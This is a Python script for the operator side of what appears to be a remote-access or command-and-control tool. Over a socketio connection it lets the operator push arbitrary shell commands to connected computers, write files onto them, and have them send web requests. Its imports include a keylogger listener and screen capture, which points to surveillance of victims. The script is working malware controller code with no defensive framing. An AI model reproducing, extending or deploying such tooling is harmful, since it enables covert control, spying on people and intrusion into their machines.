import subprocess, socketio
from enum import Enum
import requests
from time import sleep
import time
from PIL import ImageGrab
import os
from datetime import datetime, timedelta
from pynput.keyboard import Listener
import logging

logger = logging.getLogger('master')
logging.basicConfig(filename='master.log', level=logging.INFO)

sio = socketio.Client() 



def choose_action():
    while True:
        act = input("do you wish to send a command, an action or disconnect? [a/c/d]")
        if act == 'a':
            send_action()
        elif act == 'c':
            send_command()
        else:
            sio.disconnect()

def send_action():
    comm_num = input("select command from these:\n(1)write a file from /static/downloads into computer\n(2)send file name and file contents to write in computer\n(3)make a remeote request from computer(NOT WORKING)\nselected option: ")
    command = int(comm_num)
    if command == 1:
        logger.info("command 1 chosen")
        filename = input("enter file name you wish to copy: ")
        data = {'command': command, 'filename': filename, 'content': None, 'url': None, 'method': None, 'headers': None, 'payload': None}
        logger.info(f'sending command {data}')
        sio.emit('master_action', data)
        logger.info('command sent')
        if input("do you wish to send another command? [y/n]") == 'y':
            send_action()
    elif command == 2:
        logger.info("command 2 chosen")
        filename = input("enter file name: ")
        file_content = input('enter file content: ')
        data = {'command': command, 'filename': filename, 'content': file_content, 'url': None, 'method': None, 'headers': None, 'payload': None}
        logger.info(f'sending command {data}')
        sio.emit('master_action', data)
        logger.info('command sent')
        if input("do you wish to send another command? [y/n]") == 'y':
            send_action()
    elif command == 3:
        logger.info("command 3 chosen")
        url = input("enter URL: ")
        method = input("enter method: ")
        header = input("enter header: ")
        payload = input("enter payload: ")
        data = {'command': command, 'filename': None, 'content': None, 'url': url, 'method': method, 'headers': header, 'payload': payload}
        logger.info(f'sending command {data}')
        sio.emit('master_action', data)
        logger.info('command sent')
        if input("do you wish to send another command? [y/n]") == 'y':
            send_action()
    else:
        print('invalid command. try again\n\n')
        send_action()
    
    
def send_command():
    command = input("enter the command you wish to send: ")
    data = {'hi': command, 'id': 0}
    sio.emit('master_command', data=data)
    if input("do you wish to send another command? [y/n]") == 'y':
            send_command()


logger.info("starting client")
sio.connect('http://127.0.0.1:5000')
logger.info(f"connected succesfully with sid {sio.sid}")
choose_action()